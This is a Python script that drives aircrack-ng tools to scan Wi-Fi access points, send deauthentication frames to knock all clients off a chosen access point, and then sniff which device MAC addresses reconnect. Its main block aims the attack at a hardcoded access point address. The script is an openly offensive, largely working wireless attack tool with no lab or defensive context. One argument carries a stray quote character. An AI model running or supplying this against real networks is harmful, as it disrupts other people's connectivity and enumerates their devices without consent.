import subprocess
import time

interface = "wlp0s20f3"

# Returns a list containing every MAC address of every access point (AP) detected and its channel
def scan_access_points(interface):

    # Kill network processes before putting the interface in monitor mode
    try:
        subprocess.run(["sudo", "airmon-ng", "check", '"kill'], check=True)
    except subprocess.CalledProcessError as e:
        print("Error killing network processes:", e)
        exit(1)

    # Enable monitor mode
    try:
        subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)
    except subprocess.CalledProcessError as e:
        print("Error enabling monitor mode:", e)
        exit(1)

    try:
        AP_MAC_addr = []
        airodump_process = subprocess.Popen(["sudo", "airodump-ng", "--output-format", "csv", "-w", "output", interface+"mon"],
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           universal_newlines=True)

        # Wait for some time to capture access point data
        time.sleep(20)

        # Terminate airodump-ng process
        airodump_process.terminate()

        # Parse the csv file
        with open("output-01.csv", "r") as csvfile:
            lines = csvfile.readlines()
            for line in lines[2:]:  # Skip the header
                print(line)
                parts = line.strip().split(',')

                # Stop at the end of the AP addresses in the CSV file
                if len(parts) < 15:
                    break
                bssid = parts[0].strip()
                channel = parts[3].strip()
                AP_MAC_addr.append((bssid,channel))
                
    except subprocess.CalledProcessError as e:
        print("Error scanning:", e)
        exit(1)


    # Delete the airmon-ng csv file
    try:
        subprocess.run(["sudo", "rm", "output-01.csv"], check=True)
    except subprocess.CalledProcessError as e:
        print("Error deleting csv file")
        exit(1)


    # Disable monitor mode
    try:
        subprocess.run(["sudo", "airmon-ng", "stop", interface+"mon"], check=True)
    except subprocess.CalledProcessError as e:
        print("Error disabling monitor mode:", e)
        exit(1)
    
    # Restore the network manager (will enable back wifi)
    try:
        subprocess.run(["sudo", "service", "NetworkManager", "start"])
    except subprocess.CalledProcessError as e:
        print("Eror restoring the Network Manager:", e)
        exit(1)


    return AP_MAC_addr


# Function that sends deauth packets to all the devices of the AP_MAC_address 
def deauth_attack(AP_MAC_address, channel):

    # Enable monitor mode on a specific channel
    try:
        subprocess.run(["sudo", "airmon-ng", "start", interface, channel], check=True)
    except subprocess.CalledProcessError as e:
        print("Error enabling monitor mode:", e)
        exit(1)

    print("Sending deauthentication frames to the AP: " + str(AP_MAC_address))
    deauth_process = subprocess.Popen(["sudo", "aireplay-ng", "--deauth", "0", "-a", AP_MAC_address ,  interface + "mon" ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(15)
    deauth_process.terminate()

    # Disable monitor mode
    try:
        subprocess.run(["sudo", "airmon-ng", "stop", interface+"mon"], check=True)
    except subprocess.CalledProcessError as e:
        print("Error disabling monitor mode:", e)





# Function that monitors the traffic of a specific access point and
def monitor(AP_MAC_address):

     # Enable monitor mode on a specific channel
    try:
        subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)
    except subprocess.CalledProcessError as e:
        print("Error enabling monitor mode:", e)
        exit(1)


    device_addr = []
    try:
        
        airodump_process = subprocess.Popen(["sudo", "airodump-ng","--bssid",AP_MAC_address,"--output-format", "csv", "-w", "output", interface+"mon"],
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           universal_newlines=True)

        # Wait for some time to capture access point data
        time.sleep(20)
        

        # Terminate airodump-ng process
        airodump_process.terminate()

        with open("output-01.csv", "r") as csvfile:
            lines = csvfile.readlines()
            for line in lines[5:]:  # Skip the header
                parts = line.strip().split(',')
                if(len(parts) > 1):
                    device_addr.append(parts[0])


    except subprocess.CalledProcessError as e:
        print("Error scanning:", e)
        exit(1)

    try:
        subprocess.run(["sudo", "rm", "output-01.csv"], check=True)
    except subprocess.CalledProcessError as e:
        print("Error deleting csv file")
        exit(1)

    try:
        subprocess.run(["sudo", "airmon-ng", "stop", interface+"mon"], check=True)
    except subprocess.CalledProcessError as e:
        print("Error disabling monitor mode:", e)


    return device_addr
    



# Returns a list containing all the devices connected to a specific access point address
def scan_devices(AP_MAC_address, channel):

    # Kill network processes before putting the interface in monitor mode
    try:
        subprocess.run(["sudo", "airmon-ng", "check", '"kill'], check=True)
    except subprocess.CalledProcessError as e:
        print("Error killing network processes:", e)
        exit(1)


    # First deauthenticate all the devices of the access point mac address
    deauth_attack(AP_MAC_address,channel)
    # Then monitor to see who reconnects
    devices = monitor(AP_MAC_address)

    # Restore the network manager (will enable back wifi)
    try:
        subprocess.run(["sudo", "service", "NetworkManager", "start"])
    except subprocess.CalledProcessError as e:
        print("Eror restoring the Network Manager:", e)
        exit(1)


    return devices




if __name__ == "__main__":

    #target_APs = scan_access_points(interface)
    #print(target_APs)

    MAC_devices = scan_devices("F4:06:8D:B7:75:F9", "6")
    print(MAC_devices)